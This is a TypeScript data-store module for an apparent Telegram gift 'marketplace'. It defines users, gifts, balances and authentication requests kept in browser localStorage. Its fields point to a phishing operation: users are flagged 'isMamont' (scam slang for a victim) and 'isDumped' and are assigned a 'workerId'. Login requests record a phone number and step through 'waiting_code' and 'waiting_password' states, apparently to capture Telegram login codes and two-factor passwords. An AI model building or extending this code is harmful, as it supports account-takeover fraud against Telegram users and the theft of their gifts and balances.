interface User {
  userId: string
  username?: string
  firstName?: string
  balance: number
  workerId?: string
  isMamont: boolean
  isDumped: boolean
  createdAt: string
}

interface Gift {
  id: string
  userId: string
  giftId: string
  giftName: string
  starCount: number
  isNFT: boolean
  receivedAt: string
  converted: boolean
}

interface AuthRequest {
  requestId: string
  chatId: string
  phone?: string
  action: string
  status: "pending" | "waiting_code" | "waiting_password" | "success" | "error"
  createdAt: string
  updatedAt: string
  data?: any
}

class Database {
  private users: Map<string, User> = new Map()
  private gifts: Map<string, Gift[]> = new Map()
  private requests: Map<string, AuthRequest> = new Map()

  constructor() {
    if (typeof window !== "undefined") {
      this.loadFromLocalStorage()
    }
  }

  private loadFromLocalStorage() {
    try {
      const usersData = localStorage.getItem("marketplace_db_users")
      const giftsData = localStorage.getItem("marketplace_db_gifts")
      const requestsData = localStorage.getItem("marketplace_db_requests")

      if (usersData) this.users = new Map(JSON.parse(usersData))
      if (giftsData) this.gifts = new Map(JSON.parse(giftsData))
      if (requestsData) this.requests = new Map(JSON.parse(requestsData))
    } catch (error) {
      console.error("[v0] Error loading from localStorage:", error)
    }
  }

  private saveToLocalStorage() {
    if (typeof window !== "undefined") {
      try {
        localStorage.setItem("marketplace_db_users", JSON.stringify(Array.from(this.users.entries())))
        localStorage.setItem("marketplace_db_gifts", JSON.stringify(Array.from(this.gifts.entries())))
        localStorage.setItem("marketplace_db_requests", JSON.stringify(Array.from(this.requests.entries())))
      } catch (error) {
        console.error("[v0] Error saving to localStorage:", error)
      }
    }
  }

  // User operations
  async getUser(userId: string): Promise<User | null> {
    return this.users.get(userId) || null
  }

  async createUser(userId: string, username?: string, firstName?: string): Promise<User> {
    const user: User = {
      userId,
      username,
      firstName,
      balance: 0,
      isMamont: false,
      isDumped: false,
      createdAt: new Date().toISOString(),
    }
    this.users.set(userId, user)
    this.saveToLocalStorage()
    return user
  }

  async getUserBalance(userId: string): Promise<number> {
    const user = await this.getUser(userId)
    if (!user) {
      const newUser = await this.createUser(userId)
      return newUser.balance
    }
    return user.balance
  }

  async updateBalance(userId: string, amount: number, operation: "add" | "subtract" = "add"): Promise<number> {
    let user = await this.getUser(userId)
    if (!user) {
      user = await this.createUser(userId)
    }

    const newBalance = operation === "add" ? user.balance + amount : Math.max(0, user.balance - amount)

    user.balance = newBalance
    this.users.set(userId, user)
    this.saveToLocalStorage()

    return newBalance
  }

  // Gift operations
  async getUserGifts(userId: string): Promise<Gift[]> {
    return this.gifts.get(userId) || []
  }

  async addGift(userId: string, gift: Omit<Gift, "id" | "userId" | "converted">): Promise<Gift> {
    const newGift: Gift = {
      id: `gift_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      userId,
      ...gift,
      converted: false,
    }

    const userGifts = this.gifts.get(userId) || []
    userGifts.push(newGift)
    this.gifts.set(userId, userGifts)
    this.saveToLocalStorage()

    return newGift
  }

  async convertGift(giftId: string, userId: string, starCount: number): Promise<void> {
    const userGifts = this.gifts.get(userId) || []
    const gift = userGifts.find((g) => g.id === giftId)

    if (gift && !gift.converted) {
      gift.converted = true
      this.gifts.set(userId, userGifts)
      await this.updateBalance(userId, starCount, "add")
      this.saveToLocalStorage()
    }
  }

  // Request operations
  async createRequest(chatId: string, action: string, phone?: string, data?: any): Promise<AuthRequest> {
    const request: AuthRequest = {
      requestId: `req_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      chatId,
      phone,
      action,
      status: "pending",
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
      data,
    }

    this.requests.set(request.requestId, request)
    this.saveToLocalStorage()
    return request
  }

  async getPendingRequests(): Promise<AuthRequest[]> {
    return Array.from(this.requests.values()).filter((r) => r.status === "pending")
  }

  async updateRequestStatus(requestId: string, result: any): Promise<void> {
    const request = this.requests.get(requestId)
    if (request) {
      request.status = result.status
      request.updatedAt = new Date().toISOString()
      if (result.message) request.data = { ...request.data, message: result.message }
      this.requests.set(requestId, request)
      this.saveToLocalStorage()
    }
  }

  async getRequest(requestId: string): Promise<AuthRequest | null> {
    return this.requests.get(requestId) || null
  }
}

export const db = new Database()
